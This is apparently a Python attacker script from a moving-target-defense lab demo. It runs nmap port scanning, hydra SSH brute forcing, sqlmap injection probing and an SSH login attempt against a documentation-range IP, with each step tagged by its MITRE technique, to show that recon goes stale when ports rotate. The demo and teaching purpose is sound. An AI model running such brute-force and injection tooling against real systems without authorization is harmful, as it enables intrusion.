#!/usr/bin/env python3
"""Adaptive MTD Lab — Attacker script.

Runs a fixed, limited attack set in a deterministic order against the sensor's
public surface. MITRE-tagged output. The script does NOT adapt to rotations —
that's the whole point: the attacker's recon goes stale because the surface
moved, and this script doesn't know.

Usage:
    python3 run_attack.py --phase scan
    python3 run_attack.py --phase brute
    python3 run_attack.py --phase web
    python3 run_attack.py --phase ssh
    python3 run_attack.py --phase all      # runs scan -> brute -> web -> ssh

The target IP is the sensor's WAN IP (203.0.113.2). The script discovers the
current public ports by scanning (phase 1), then uses those ports for the
later phases. If MTD rotates the ports between phases, the later phases hit
dead ports — exactly what the demo is meant to show.
"""

from __future__ import annotations

import argparse
import json
import os
import subprocess
import sys
import time
from pathlib import Path


TARGET = os.environ.get("MTD_TARGET", "203.0.113.2")
DASHBOARD = os.environ.get("MTD_DASHBOARD", f"https://{TARGET}:43123")
HERE = Path(__file__).parent
USERS = HERE / "users.txt"
PASS = HERE / "pass.txt"

# Where we stash the scan results so later phases can use them
SCAN_CACHE = HERE / "scan_results.json"


def log(phase: str, mitre: str, msg: str, ok: bool = True) -> None:
    """MITRE-tagged log line. ok=True green, ok=False red."""
    color = "\033[32m" if ok else "\033[31m"
    reset = "\033[0m"
    print(f"{color}[{phase}] {mitre} {msg}{reset}")


def run(cmd: list, timeout: int = 60) -> tuple:
    """Run a command, return (returncode, stdout, stderr)."""
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return r.returncode, r.stdout, r.stderr
    except subprocess.TimeoutExpired:
        return 124, "", "timeout"


def phase_scan() -> dict:
    """T1046 — Network Service Scanning. nmap -sS -p- against the target."""
    log("scan", "T1046", f"scanning {TARGET} (all ports)...")
    rc, out, err = run(["nmap", "-n", "-sS", "-p", "1-100", "-T4", "--open", "-Pn", TARGET], timeout=60)
    # Parse open ports from nmap output
    open_ports = []
    for line in out.splitlines():
        line = line.strip()
        if "/tcp" in line and "open" in line:
            parts = line.split()
            if parts:
                try:
                    open_ports.append(int(parts[0].split("/")[0]))
                except ValueError:
                    continue
    # Pick the SSH and HTTPS ports from the pool we know about
    ssh_candidates = [p for p in open_ports if p in (22, 2222, 22022, 20222, 22002)]
    https_candidates = [p for p in open_ports if p in (443, 8443, 4443, 8444, 4444)]
    ssh_port = ssh_candidates[0] if ssh_candidates else None
    https_port = https_candidates[0] if https_candidates else None
    result = {
        "open_ports": open_ports,
        "ssh_port": ssh_port,
        "https_port": https_port,
        "timestamp": time.time(),
    }
    SCAN_CACHE.write_text(json.dumps(result, indent=2))
    log("scan", "T1046", f"scan complete: {len(open_ports)} ports open, ssh={ssh_port}, https={https_port}")
    return result


def phase_brute(scan: dict) -> None:
    """T1110 — Brute Force. hydra against the discovered SSH port."""
    ssh_port = scan.get("ssh_port") or 22
    log("brute", "T1110", f"brute forcing SSH on {TARGET}:{ssh_port}...")
    rc, out, err = run([
        "hydra", "-L", str(USERS), "-P", str(PASS),
        "-s", str(ssh_port), "-f", "-t", "4",
        "ssh://", TARGET,
    ], timeout=120)
    # hydra returns 0 if creds found, non-zero otherwise
    if rc == 0:
        log("brute", "T1110", "credentials found (check output below)")
        print(out)
    else:
        log("brute", "T1110", "no credentials found (or port unreachable)", ok=False)
        if err:
            print(err, file=sys.stderr)


def phase_web(scan: dict) -> None:
    """T1190 — Exploit Public-Facing Application. sqlmap against the HTTPS endpoint."""
    https_port = scan.get("https_port") or 443
    url = f"https://{TARGET}:{https_port}/login?user=1"
    log("web", "T1190", f"sqlmap probing {url}...")
    rc, out, err = run([
        "sqlmap", "-u", url, "--batch", "--level=1",
        "--threads=2", "--timeout=10",
        "--output-dir=/tmp/sqlmap-out",
    ], timeout=120)
    if "injectable" in out.lower() or "is vulnerable" in out.lower():
        log("web", "T1190", "vulnerability found (check output below)")
        print(out)
    else:
        log("web", "T1190", "no injectable parameters (or port unreachable)", ok=False)
        if err:
            print(err, file=sys.stderr)


def phase_ssh(scan: dict) -> None:
    """T1078 — Valid Accounts (attempted). ssh login with a guessed credential."""
    ssh_port = scan.get("ssh_port") or 22
    # Try a common credential pair (won't actually succeed on the real server
    # because we set PermitRootLogin no and maverick has a strong password).
    # The point is to show the *attempt* — and that it fails when MTD rotated.
    log("ssh", "T1078", f"attempting ssh login to {TARGET}:{ssh_port} as maverick...")
    rc, out, err = run([
        "ssh", "-p", str(ssh_port),
        "-o", "StrictHostKeyChecking=no",
        "-o", "UserKnownHostsFile=/dev/null",
        "-o", "ConnectTimeout=8",
        "-o", "PasswordAuthentication=no",
        "-o", "BatchMode=yes",
        "maverick@" + TARGET, "echo LOGGED_IN",
    ], timeout=15)
    if rc == 0 and "LOGGED_IN" in out:
        log("ssh", "T1078", "login succeeded — full compromise")
        print(out)
    else:
        log("ssh", "T1078", "login failed (port unreachable or key rejected)", ok=False)
        if err:
            print(err, file=sys.stderr)


def main() -> int:
    global TARGET
    parser = argparse.ArgumentParser(description="Adaptive MTD Lab attacker")
    parser.add_argument("--phase", choices=["scan", "brute", "web", "ssh", "all"], default="all")
    parser.add_argument("--target", default=TARGET, help="target IP (default: 203.0.113.2)")
    args = parser.parse_args()

    TARGET = args.target

    phases = ["scan", "brute", "web", "ssh"] if args.phase == "all" else [args.phase]

    scan = None
    for phase in phases:
        if phase == "scan":
            scan = phase_scan()
        elif phase == "brute":
            scan = scan or _load_scan()
            phase_brute(scan)
        elif phase == "web":
            scan = scan or _load_scan()
            phase_web(scan)
        elif phase == "ssh":
            scan = scan or _load_scan()
            phase_ssh(scan)
        # Small pause so the audience can read the output
        time.sleep(1)

    log("done", "", "attack sequence complete")
    return 0


def _load_scan() -> dict:
    """Load cached scan results (so brute/web/ssh can run standalone after scan)."""
    if SCAN_CACHE.exists():
        return json.loads(SCAN_CACHE.read_text())
    # No scan yet — run one implicitly
    log("scan", "T1046", "no scan cache — running scan first...")
    return phase_scan()


if __name__ == "__main__":
    sys.exit(main())
